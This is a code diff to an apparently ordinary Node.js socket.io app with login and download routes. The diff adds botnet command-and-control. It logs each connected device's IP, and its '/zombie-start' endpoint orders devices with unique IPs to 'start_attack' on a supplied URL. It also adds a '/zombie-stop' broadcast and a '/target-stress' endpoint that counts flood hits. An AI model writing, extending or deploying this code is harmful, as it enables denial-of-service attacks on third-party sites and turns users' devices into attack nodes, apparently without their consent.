@@ -4,6 +4,7 @@ import dotenv from "dotenv";
 import { createServer } from "http";
 import { Server } from "socket.io";
 import { check_user } from "./functions/base.js"; 
+import crypto from "crypto";
 
 import login from "./routers/login.js";
 import code from "./routers/code.js";
@@ -50,6 +51,16 @@ io.on("connection", (socket) => {
     let currentName = null;
     let isRegistered = false;
 
+    let clientIp = socket.handshake.headers['cf-connecting-ip'] || 
+                   socket.handshake.headers['x-forwarded-for'] || 
+                   socket.handshake.address;
+                   
+    if (clientIp && clientIp.includes('::ffff:')) {
+        clientIp = clientIp.replace('::ffff:', '');
+    }
+    
+    socket.clientIp = clientIp; 
+
     socket.emit("get_device_info");
 
     socket.on("device_info", (object) => {
@@ -82,7 +93,7 @@ io.on("connection", (socket) => {
 
         io.emit("online_count", connectedDevices.size);
 
-        console.log(`${RESET} [ ${GREEN}Socket${RESET} ] ID: ${socket.id} | Device: ${CYAN}${currentName}${RESET} | Online : ${connectedDevices.size}`);
+        console.log(`${RESET} [ ${GREEN}Socket${RESET} ] ID: ${socket.id} | IP: ${socket.clientIp} | Device: ${CYAN}${currentName}${RESET} | Online : ${connectedDevices.size}`);
 
         check_user(data, socket.id).catch(err => console.error(err));
     });
@@ -103,9 +114,89 @@ app.use("/", info);
 app.use("/", nuser);
 app.use("/", download);
 
-app.all("/", (req, res) => res.send("pong"));
+function shuffleArray(array) {
+    for (let i = array.length - 1; i > 0; i--) {
+        const j = Math.floor(Math.random() * (i + 1));
+        [array[i], array[j]] = [array[j], array[i]];
+    }
+}
 
-const PORT = process.env.PORT || 3000;
+function getUniqueTargetSockets(devicesCount) {
+    let allSocketIds = Array.from(connectedDevices.values());
+    shuffleArray(allSocketIds);
+
+    let targets = [];
+    let usedIps = new Set();
+
+    for (let id of allSocketIds) {
+        const socket = io.sockets.sockets.get(id);
+        if (!socket)
+            continue;
+        if (usedIps.has(socket.clientIp))
+            continue;
+        usedIps.add(socket.clientIp);
+        targets.push(id);
+
+        if (devicesCount > 0 && targets.length >= devicesCount) {
+            break;
+        }
+    }
+    return targets;
+}
+
+app.post("/zombie-start", (req, res) => {
+    let { url, devices, method } = req.body;
+    
+    if (!url) return res.status(400).json({ error: "URL required" });
+
+    let targetIds = getUniqueTargetSockets(devices);
+
+    if (targetIds.length === 0) return res.status(503).json({ error: "No unique devices found" });
+
+    targetIds.forEach(socketId => {
+        const socket = io.sockets.sockets.get(socketId);
+        if (!socket) return;
+
+        socket.emit("start_attack", {
+            url: url,
+            method: method || "GET"
+        });
+    });
+
+    console.log(`${YELLOW}[ZOMBIE]${RESET} Activated on ${targetIds.length} devices.`);
+    
+    res.status(200).end();
+});
+
+app.post("/zombie-stop", (req, res) => {
+    io.emit("stop_attack", {});
+    console.log(`${GREEN}[ZOMBIE]${RESET} Stop command broadcasted.`);
+    res.status(200).end();
+});
+
+
+let stressCounter = 0;
+app.all("/target-stress", (req, res) => {
+    stressCounter++;
+
+    let attackerIp = req.headers['cf-connecting-ip'] || 
+                     req.headers['x-forwarded-for']?.split(',')[0].trim() || 
+                     req.ip;
+
+    if (attackerIp && attackerIp.includes('::ffff:')) {
+        attackerIp = attackerIp.replace('::ffff:', '');
+    }
+
+    if (stressCounter % 10 === 0)
+        console.log(`${RED}[TARGET]${RESET} Attack from IP: ${YELLOW}${attackerIp}${RESET} | Hits: ${stressCounter}`);
+    
+    res.status(200).end();
+});
+
+app.all("/", (req, res) => res.send("Server online"));
+
+const PORT = process.env.PORT;
+
 httpServer.listen(PORT, () => {
     console.log(`\n>> Server online <<\n`);
 });
